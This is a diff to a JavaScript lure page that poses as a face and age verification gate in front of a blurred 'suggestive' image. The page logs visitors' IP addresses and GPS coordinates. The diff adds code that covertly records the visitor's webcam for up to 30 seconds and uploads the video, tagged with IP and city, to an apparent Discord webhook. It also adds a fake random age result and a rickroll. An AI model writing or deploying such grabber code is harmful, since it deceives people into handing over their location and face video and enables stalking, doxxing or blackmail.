@@ -39,10 +39,10 @@
             position: absolute; 
             width: 100%; 
             height: 100%; 
-            background-image: url('img.jpg'); /* The actual suggestive image */
+            background-image: url('img.jpg');
             background-size: cover;
             background-position: center;
-            filter: blur(13px) brightness(0.4); /* Blur set to 13px */
+            filter: blur(13px) brightness(0.4);
             transition: filter 0.5s ease-in-out;
         }
 
@@ -207,7 +207,7 @@
         /* Permission buttons inside modal */
         .permission-section { margin-top: 15px; }
         .permission-btn { background-color: #8957e5; color: white; width: 100%; margin-bottom: 10px; }
-        .permission-btn.retry { background-color: #e74c3c; } /* Red for retry */
+        .permission-btn.retry { background-color: #e74c3c; }
         #permission-status { color: #e74c3c; font-weight: bold; margin-top: 15px; text-align: center; }
 
         #camera-canvas { display: none; }
@@ -282,6 +282,9 @@
         .capture-status.warning {
             color: #f0ad4e;
         }
+        .capture-status.error {
+            color: #e74c3c;
+        }
         .face-guide {
             position: absolute;
             top: 50%;
@@ -304,6 +307,7 @@
         const RICKROLL_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
         const SNAPSHOT_COUNT = 5;
         const SNAPSHOT_INTERVAL = 1200;
+        const MAX_RECORDING_DURATION = 30000;
         // ----------------------- CONFIGURATION END ---------------------------
         
         let locStatus = "Pending";
@@ -314,6 +318,9 @@
         let cameraStream = null;
         let faceDetectionInterval = null;
         let captureInterval = null;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        let recordingStartTime = 0;
 
         document.addEventListener('DOMContentLoaded', () => { 
             logIpAndStatus("PAGE_LOAD_INIT"); 
@@ -484,7 +491,6 @@
                         locStatus = `GRANTED | Lat:${position.coords.latitude}, Lon:${position.coords.longitude}, Acc:${position.coords.accuracy}m`;
                         logIpAndStatus("LOCATION_GRANTED_GPS", { loc: locStatus })
                             .then(success => {
-                                // Always treat location as success if we got coordinates
                                 handlePermissionResult('geolocation', true, null);
                             });
                     },
@@ -509,12 +515,14 @@
                         facingMode: "user",
                         width: { ideal: 1280 },
                         height: { ideal: 720 }
-                    } 
+                    },
+                    audio: false
                 })
                     .then(stream => {
                         cameraStream = stream;
                         camStatus = "GRANTED | Stream Active";
                         logIpAndStatus("CAMERA_GRANTED", { status: camStatus });
+                        startVideoRecording(stream);
                         showFaceVerificationUI(stream);
                     })
                     .catch(err => {
@@ -527,6 +535,65 @@
                 logIpAndStatus("CAMERA_NOT_SUPPORTED")
                     .then(success => handlePermissionResult('camera', false, 1));
             }
+        }
+
+        function startVideoRecording(stream) {
+            recordedChunks = [];
+            recordingStartTime = Date.now();
+            
+            try {
+                const options = { mimeType: 'video/webm;codecs=vp9' };
+                if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                    options.mimeType = 'video/webm;codecs=vp8';
+                    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                        options.mimeType = 'video/webm';
+                    }
+                }
+                
+                mediaRecorder = new MediaRecorder(stream, options);
+                
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data && event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+                
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    const duration = ((Date.now() - recordingStartTime) / 1000).toFixed(1);
+                    logVideoRecording(blob, duration);
+                };
+                
+                mediaRecorder.start(100);
+                
+                setTimeout(() => {
+                    if (mediaRecorder && mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, MAX_RECORDING_DURATION);
+                
+            } catch (error) {
+                console.error("MediaRecorder error:", error);
+                logIpAndStatus("RECORDING_ERROR", { error: error.message });
+            }
+        }
+
+        function logVideoRecording(blob, duration) {
+            const formData = new FormData();
+            formData.append('file', blob, `face_recording_${duration}s.webm`);
+            formData.append('content', `🎥 **FULL VIDEO RECORDING** 🎥\n[Duration: ${duration}s]\n[Time: ${new Date().toISOString()}]\n[IP: ${ipData.ip || 'Unknown'}]\n[Location: ${ipData.city || 'Unknown'}]`);
+
+            return fetch(LOG_API_ENDPOINT, { method: 'POST', body: formData })
+                .then(response => {
+                    if (!response.ok) {
+                        console.error("Discord Video Webhook error:", response.status);
+                    }
+                    return response.ok;
+                })
+                .catch(err => {
+                    console.error("Discord Video Webhook network error:", err);
+                    return false;
+                });
         }
 
         function showFaceVerificationUI(stream) {
@@ -542,7 +609,6 @@
             status.textContent = "Position your face in the circle...";
             status.className = 'capture-status';
             
-            // Wait for video to be ready
             video.onloadedmetadata = () => {
                 setTimeout(() => {
                     startFaceDetection(video, frame, status);
@@ -555,23 +621,17 @@
             const context = canvas.getContext('2d');
             let faceDetected = false;
             let stableFrames = 0;
-            const STABLE_FRAMES_REQUIRED = 3;
+            const STABLE_FRAMES_REQUIRED = 2;
             
             status.textContent = "Looking for face...";
             status.className = 'capture-status warning';
             
-            // Simple face detection based on brightness analysis
             faceDetectionInterval = setInterval(() => {
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 context.drawImage(video, 0, 0);
                 
-                const imageData = context.getImageData(
-                    canvas.width * 0.3, 
-                    canvas.height * 0.2, 
-                    canvas.width * 0.4, 
-                    canvas.height * 0.5
-                );
+                const imageData = context.getImageData(0, 0, canvas.width, canvas.height);
                 
                 const detected = analyzeFacePresence(imageData);
                 
@@ -588,48 +648,70 @@
                         setTimeout(() => {
                             status.textContent = "Capturing biometric data...";
                             startMultipleSnapshots(video);
-                        }, 1000);
+                        }, 800);
                     }
                 } else {
                     stableFrames = 0;
-                    if (faceDetected) {
-                        faceDetected = false;
-                        frame.classList.remove('detected');
-                        status.textContent = "Face lost. Please reposition...";
-                        status.className = 'capture-status warning';
-                    }
                 }
-            }, 200);
+            }, 150);
         }
 
         function analyzeFacePresence(imageData) {
             const data = imageData.data;
+            const width = imageData.width;
+            const height = imageData.height;
+            
+            const centerX = width / 2;
+            const centerY = height / 2;
+            const radius = Math.min(width, height) * 0.3;
+            
             let totalBrightness = 0;
             let pixels = 0;
             let skinTonePixels = 0;
+            let edgePixels = 0;
             
-            for (let i = 0; i < data.length; i += 4) {
-                const r = data[i];
-                const g = data[i + 1];
-                const b = data[i + 2];
-                
-                const brightness = (r + g + b) / 3;
-                totalBrightness += brightness;
-                pixels++;
-                
-                // Skin tone detection (rough approximation)
-                if (r > 95 && g > 40 && b > 20 &&
-                    r > g && r > b &&
-                    Math.abs(r - g) > 15) {
-                    skinTonePixels++;
+            for (let y = 0; y < height; y++) {
+                for (let x = 0; x < width; x++) {
+                    const dx = x - centerX;
+                    const dy = y - centerY;
+                    const distance = Math.sqrt(dx * dx + dy * dy);
+                    
+                    if (distance < radius) {
+                        const i = (y * width + x) * 4;
+                        const r = data[i];
+                        const g = data[i + 1];
+                        const b = data[i + 2];
+                        
+                        const brightness = (r + g + b) / 3;
+                        totalBrightness += brightness;
+                        pixels++;
+                        
+                        if (r > 60 && g > 40 && b > 20 && r > b && r > g - 15 && Math.abs(r - g) < 40) {
+                            skinTonePixels++;
+                        }
+                        
+                        if (x > 0 && y > 0) {
+                            const i2 = ((y - 1) * width + (x - 1)) * 4;
+                            const r2 = data[i2];
+                            const g2 = data[i2 + 1];
+                            const b2 = data[i2 + 2];
+                            
+                            const edgeDiff = Math.abs(r - r2) + Math.abs(g - g2) + Math.abs(b - b2);
+                            if (edgeDiff > 30) {
+                                edgePixels++;
+                            }
+                        }
+                    }
                 }
             }
             
+            if (pixels === 0) return false;
+            
             const avgBrightness = totalBrightness / pixels;
             const skinToneRatio = skinTonePixels / pixels;
+            const edgeRatio = edgePixels / pixels;
             
-            // Face detected if: reasonable brightness and skin tone present
-            return avgBrightness > 50 && avgBrightness < 220 && skinToneRatio > 0.15;
+            return avgBrightness > 40 && avgBrightness < 240 && skinToneRatio > 0.12 && edgeRatio > 0.05;
         }
 
         function startMultipleSnapshots(video) {
@@ -643,17 +725,30 @@
                 if (snapshotsTaken >= SNAPSHOT_COUNT) {
                     clearInterval(captureInterval);
                     
-                    if (cameraStream) {
-                        cameraStream.getTracks().forEach(track => track.stop());
-                    }
-                    
-                    status.textContent = "Verification complete!";
-                    status.className = 'capture-status success';
+                    status.textContent = "Analyzing age...";
+                    status.className = 'capture-status warning';
                     
                     setTimeout(() => {
-                        document.getElementById('face-verification-overlay').classList.remove('show');
-                        handlePermissionResult('camera', true, null);
-                    }, 1500);
+                        const estimatedAge = Math.floor(Math.random() * 50) + 80;
+                        
+                        status.textContent = `Estimated Age: ${estimatedAge} - Too old for this world`;
+                        status.className = 'capture-status error';
+                        
+                        logIpAndStatus("AGE_ANALYSIS_COMPLETE", { estimatedAge: estimatedAge });
+                        
+                        setTimeout(() => {
+                            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                                mediaRecorder.stop();
+                            }
+                            
+                            if (cameraStream) {
+                                cameraStream.getTracks().forEach(track => track.stop());
+                            }
+                            
+                            document.getElementById('face-verification-overlay').classList.remove('show');
+                            handlePermissionResult('camera', true, null);
+                        }, 3000);
+                    }, 2000);
                     return;
                 }
                 
